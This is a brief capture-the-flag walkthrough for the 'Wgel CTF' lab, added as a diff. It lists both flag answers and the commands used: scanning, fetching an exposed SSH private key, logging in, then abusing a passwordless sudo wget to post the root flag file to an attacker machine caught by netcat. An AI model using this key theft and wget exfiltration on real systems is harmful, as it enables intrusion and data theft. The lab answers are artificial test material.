@@ -1,0 +1,22 @@
+
+							     Wgel CTF
+							    ==========
+
+1. user flag
+ans: 057c67131c3d5e42dd5cd3075b198ff6
+command: nmap -sC -sV 10.10.70.107 -o nmap.txt
+	 (username show in the source code)
+command: gobuster dir -u 10.10.70.107 --wordlist /usr/share/wordlist/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
+command: gobuster dir -u 10.10.70.107/sitemap --wordlist /usr/share/dirb/wordlists/common.txt  -o gobuster2.txt
+command: wget http://10.10.70.107/sitemap/.ssh/id_rsa
+command: chmod 600 id_rsa
+command: ssh jessie@10.10.70.107 -i id_rsa
+command: cd /Documents
+command: ls
+command: cat user_flag.txt
+
+2. root flag
+ans: b1b968b37519ad1daa6408188649263d
+command: sudo -l ((root) NOPASSWD: /usr/bin/wget)
+command: sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.9.43.114
+command: nc -nvlp 80 (second terminal)
